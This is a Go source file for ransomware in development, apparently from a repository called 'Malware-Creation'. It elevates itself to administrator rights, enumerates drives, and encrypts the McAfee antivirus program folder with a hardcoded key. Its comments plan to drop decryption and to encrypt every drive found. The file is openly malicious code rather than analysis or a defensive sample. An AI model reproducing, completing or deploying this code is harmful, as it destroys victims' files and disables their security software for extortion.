package main

import (
	"fmt"

	"github.com/Redhead92/Malware-Creation/tree/main/redware/Block1_Crypt/foldercrypt"
	"github.com/Redhead92/Malware-Creation/tree/main/redware/Block2_Fwalk/filewalk"
)

const BlockSize = 16

// func keygen() {
// //Use key in smart way to encrypt file
// }

func main() {

	if !filewalk.AmAdmin(){
		filewalk.RunMeElevated()
	}
	
	//testing section
	dirs := filewalk.GetDrives()
	fmt.Printf("Drives found: %v \n", dirs)
	testfolder := "C:/Program Files/McAfee/"
	testkey := "6368616e676520746869732070617373"
	
	//For testing, remove decryption later
	fmt.Println("Choose Encrypt (E) or Decrypt (D)")
	var input string
	fmt.Scanln(&input)
	foldercrypt.Foldercrypt(input, testfolder, testkey)

	//final code, loop through all drives found and encrypt them
	// for _, dir := range dirs{
	// 	foldercrypt.Foldercrypt(input,dir,testkey)
	// }
}
